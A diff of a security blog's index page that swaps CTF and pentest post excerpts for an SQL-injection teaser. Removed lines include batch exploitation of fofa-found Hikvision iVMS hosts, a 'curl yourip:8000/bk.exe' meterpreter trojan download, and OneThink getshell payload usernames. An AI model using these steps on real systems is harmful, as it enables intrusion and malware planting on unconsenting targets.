@@ -71,6 +71,8 @@
     <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
     
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -194,10 +196,8 @@
 </head>
 
     
-        <body class="home-body">
     
-    
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
@@ -213,34 +213,21 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 文章页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Bak6ry's Blog
-            <!-- 文章页  -->
-            
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
-            
-            
-                Never say never
-            
-            <!-- 文章页  -->
             
         </p>
         <!-- 文章页meta -->
@@ -352,147 +339,22 @@ height:50vh;
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/31/ctf入门总结/" >
+        <a class="abstract-title" href = "/2020/04/23/渗透测试-漏洞之sql注入/" >
             
-                <span>ctf入门总结</span>
+                <span>sql注入复习</span>
         </a>
         <div class="abstract-content">
-            下面中实验室指的是网络安全实验室
-题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些，
-文中所有知识点内容并不全，要学习原理及深入得自己去找资源学习，自学与搜集信息的能力是必不可少的
-入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》
-什么是CTF？CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA
-1.养成看源代码的习惯(简单)flag在源代码中()...
+            渗透测试-漏洞之sql注入按照注入点类型来分类
+数字型注入点http://xxx.com/users.php?id=1 基于此种形式的注入
+一类的 SQL 语句原型大概为 select  from 表名 where id=1 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select  from 表名 where id=1 and 1=1
+字符型注入点http://xxx.com/users.php?name=admin 这种形式
+SQL 语句原型大概为 select * from 表名 where name=’admin’
+可以是单引号或者是双引号。若存在注入，我们可以...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/31</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/31/rwctf/" >
-            
-                <span>rwctf和南电新生平台一题</span>
-        </a>
-        <div class="abstract-content">
-            #rwctf
-##签到题
-想了好久，结果发现只要尝试对这个网站进行常规的攻击，就会给flag，这个比赛果然果然比较接近实战
-##dot free先测试了一下那个输入框里输入的地址会不会访问，发现不会，但是输入不同的值后端传回不同的内容，测试了一下感觉是个正则，因为正则用的比较多，我就想如果给正则传一个意外的值正则有可能会报错看看它后端到底是怎么写的,fuzz测试后发现post url=1会报错，报错页面中存在正则
-e.data.iframe.value.indexOf(&apos;.&apos;) == -1
-e.data.iframe.value.indexOf(&quot;//&qu...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/31</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/23/渗透海康卫视/" >
-            
-                <span>渗透实战</span>
-        </a>
-        <div class="abstract-content">
-            渗透实战fofa搜索引擎搜索 “iVMS-4200”
-
-信息收集漏洞利用教程
-批量利用构造批量攻击exp。将url导入url.txt中。python运行攻击exp
-ptyhon haikang.py -f url.txt
-getshell批量getshell
-用菜刀连接webshell
-用Python建立一个http服务用来传输文件
-python -m SimpleHTTPServer 8080
-
-生成免杀木马免杀教程
-##上传木马
-webshell打开命令行窗口运行如下命令，下载生成好的meterpreter木马到目标机上
-curl yourip:8000/bk.exe -f bk.e...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/23</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/28/巅峰极客/" >
-            
-                <span>巅峰极客2018第一场部分wp</span>
-        </a>
-        <div class="abstract-content">
-            web：拿到题目先百度一下，于是找到onethink的一个漏洞。
-WooYun-2016-185742
-就是注册个账号为：
-%250a%24a%3d%24_GET%5ba%5d%3b%2f%2f%250aecho+%60%24a%60%3b%2f%2f
-就可以getshell， 但因为账号长度有限制。所以分别两个来注册
- 账号一的用户名：%0a$a=$_GET[a];//
- 账号二的用户名：%0aecho $a;//
- 注意要用burp来改包，不然会失败。之后依次登入，也要用burp来改包登入。在那之后然后访问生成的缓存文件
-本题的关键是通过源码www.zip泄露在本地浮现的时候找到生成...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/28</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/23/sctf2018/" >
-            
-                <span>sctf2018部分wp</span>
-        </a>
-        <div class="abstract-content">
-            神奇的Modbus发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。
-神秘的交易 
-学习链接：https://bbs.pediy.com/thread-151259.htm
-因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节地址 一个字节数据
- 物体会依次发送该数据包到卡片，其中s1 s2 s3拼在一起就是那三个字节的口令了！
-
-.找数据s1 在中间标线处找到0x33的二进制：11001100（注意数完一个字节）
-...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/23</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/23</span>
             </div>
             <!-- tags  -->
             
@@ -501,117 +363,8 @@ WooYun-2016-185742
     
     <!-- paginator  -->
     
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/page/2/">&#60; PREV</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
-    
 </main>
             <!-- profile -->
-            
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/Misaka.jpg >
-    <div class="profile-name">bak6ry</div>
-    
-    <div class="profile-signature">
-        witness me
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
-            
-                <a href="mailto:1183621141@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/bak6ry" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-            
-                <span class="iconfont-archer wechat" title=wechat>
-                  
-                  <img class="profile-qr" src="/assets/example_qr.png" />
-                </span>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-            
-                <a href="/bak6ry" class="iconfont-archer twitter" target="_blank" title=twitter></a>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-            
-                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
-            
-        
-    
-
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href= //hu3sky.ooo/ target="_black">Hu3sky</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href= //hpdoger.me/ target="_black">hpdoger</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
             
         </div>
         <footer class="footer footer-unloaded">
